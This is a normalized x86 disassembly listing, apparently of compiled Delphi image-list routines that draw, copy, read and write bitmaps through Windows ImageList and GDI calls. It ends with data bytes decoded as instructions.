xor eax eax
pop ebx
retn
mov eax ebx
call sub_44daf4
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_44dd20
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44dd9f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44dcfc
cmp esi eax
jl r-xdata
mov eax ebx
call sub_44d9b8
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
mov eax ebx
mov si 0xffef
call sub_403418
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dda6
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
push esi
mov eax ebx
call sub_44daf4
push eax
call ImageList_Remove
sub_44ddb8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d9b8
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_44d808
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_403418
pop esi
pop ebx
retn
sub_44ddf0
push ebx
mov ebx eax
mov eax ebx
call sub_44d9b8
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_44daf4
push eax
call ImageList_GetBkColor
call sub_44d828
pop ebx
retn
sub_44de18
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_44d9b8
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_44d808
push eax
mov eax ebx
call sub_44ddf0
call sub_44d808
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_423dcc
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_44daf4
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_4286b8
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_423684
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_418d68
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_4286b8
pop edx
call sub_423a28
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_4286b8
call sub_423dcc
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_44daf4
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_418d68
mov eax [ ebx + 0x54 ]
call sub_4286b8
call sub_423dcc
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_423684
mov eax edi
call sub_423dcc
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_423684
mov eax edi
call sub_423dcc
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_4280f0
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_429428
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_44dfec
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_44e010
pop ebx
pop ebp
retn 0xc
sub_44e010
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d9b8
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_44e05c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_418d68
mov eax [ ebp - 0x4 ]
call sub_44ecf0
xor eax eax
push ebp
push sub_44e1f5
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4280f0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44e1d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4280f0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44e1bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_429428
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e1c2
mov eax [ ebp - 0x10 ]
call sub_40321c
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_4286b8
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_423a28
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_423dcc
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_4286b8
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_423a28
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_423dcc
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44dc30
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_44e204
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44daf4
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_44e05c
sub_44e224
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov eax ebx
call sub_44db58
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_41a740
mov eax ebx
call sub_44ddac
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_44e40c
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_44daf4
mov edx eax
mov eax ebx
call sub_44da90
mov eax ebx
call sub_44d9b8
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_44daf4
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_44d9c0
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44daf4
push eax
call ImageList_GetBkColor
call sub_44d828
mov edx eax
mov eax ebx
call sub_44ddb8
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_44e204
jmp r-xdata
sub_44e2e4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_41a824
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_44e40c
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_44ddac
mov eax esi
call sub_44daf4
mov edx eax
mov eax ebx
call sub_44da90
mov eax ebx
call sub_44d9b8
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_44daf4
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_44d9c0
jmp r-xdata
mov eax esi
call sub_44daf4
push eax
call ImageList_GetBkColor
call sub_44d828
mov edx eax
mov eax ebx
call sub_44ddb8
mov edx esi
mov eax ebx
call sub_44e204
pop esi
pop ebx
retn
sub_44e394
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44e400
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e407
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_44e434
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_41a19c
mov si 0xffff
call sub_403418
inc ebp
dec edi
jne r-xdata
sub_44e484
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41a08c
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41a19c
cmp ebp eax
jne r-xdata
sub_44e4dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_407f98
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_44e520
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_44dcfc
mov ebx eax
mov eax edi
call sub_44dcfc
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_44dcfc
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44e5fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44e5df
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_44e4dc
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e5e6
mov eax [ ebp - 0xc ]
call sub_40321c
retn
mov eax edi
call sub_44dcfc
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_44e610
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_44dcfc
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_44e520
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_44e66c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41feb4
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_44e610
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44e6c4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_41c008
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_41c008
mov dl 0x1
mov eax [ r-xdata ]
call sub_4280f0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44e948
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41bddc
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_41bdfc
mov dl 0x1
mov eax [ r-xdata ]
call sub_4280f0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44e92b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4280f0
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4280f0
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_429428
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_418d68
mov eax [ ebp - 0x4 ]
call sub_44ecf0
xor eax eax
push ebp
push sub_44e90e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e915
mov eax [ ebp - 0xc ]
call sub_40321c
mov eax [ ebp - 0x14 ]
call sub_40321c
mov eax [ ebp - 0x4 ]
call sub_44ecf4
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_418d90
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4286b8
push eax
mov eax [ ebp - 0xc ]
call sub_4286b8
lea edx [ ebp - 0x30 ]
pop ecx
call sub_4238f4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_418d90
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4286b8
push eax
mov eax [ ebp - 0x14 ]
call sub_4286b8
lea edx [ ebp - 0x30 ]
pop ecx
call sub_4238f4
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44dc30
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_44e958
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_420634
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44e9b8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44dac8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e9bf
mov eax [ ebp - 0xc ]
call sub_40321c
retn
sub eax 0xffffffec
sub_44e9bf
mov eax [ ebp - 0x4 ]
call sub_44d9b8
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44eaee
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41bdfc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_41c504
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41bdfc
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_40321c
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_41bdfc
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_420634
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44ead1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_41bdfc
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44dac8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40321c
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41bdfc
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_44eb20
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_44db58
mov eax edi
call sub_41bddc
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_41bdfc
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_44e6c4
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_44e958
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44ebac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_420634
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44eca6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40c15c
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_44daf4
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_44daf4
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ecad
mov eax [ ebp - 0x4 ]
call sub_40321c
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
jmp r-xdata
sub_44ed14
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40320c
test bl bl
jle r-xdata
mov edx esi
call sub_44e484
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_44ed60
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44ed85
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ed8c
retn
sub_44ed9c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0xed
inc esp
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
or [ eax ] dl
push esp
dec ebp
outsb
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ edx ] cl
inc ebp
dec ebp
outsb
jne r-xdata
add [ eax ] cl
inc esp
add [ eax ] al
adc [ eax ] al
mov esi gs
inc esp
add [ eax ] cl
adc dl [ ebp + ecx * 2 + 0x65 ]
outsb
jne r-xdata
push 0x65676e61
inc ebp
jbe r-xdata
jne r-xdata
xor al 0xee
inc esp
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x65 ] dl
outsb
jb r-xdata
pop es
jb r-xdata
jb r-xdata
outsb
je r-xdata
or [ gs : ebp + ecx * 2 + 0x65 ] edx
outsb
outsd
jb r-xdata
push esp
sbb [ edx ] eax
add [ eax ] al
add [ eax ] al
mov esp 0x70004062
out dx eax
outsb
arpl [ ebp + 0x64 ] sp
add [ eax ] cl
sbb dl [ ecx + eax * 2 + 0x64 ]
jbe r-xdata
ja r-xdata
or [ edi ] al
inc ecx
inc ebx
popad
outsb
jbe r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
arpl [ eax + ecx + 0x7 ] si
je r-xdata
mov ebp gs
inc esp
add bl al
hlt
jb r-xdata
popad
jae r-xdata
push esp
dec edi
ja r-xdata
jb r-xdata
outsb
add [ ecx + edx + 0x40 ] bl
add [ ecx + ebx + 0x42 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
nop
clc
out dx al
inc esp
je r-xdata
jb r-xdata
jae r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
inc edx
outsd
outsd
insb
popad
arpl [ eax + eax + 0x8 ] si
insd
add [ edi ] al
push edx
bound esi [ gs : ebp + 0x69 ]
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] bl
pop esp
adc [ eax ] eax
push esp
sbb [ edx ] eax
push esp
adc [ eax ] al
popad
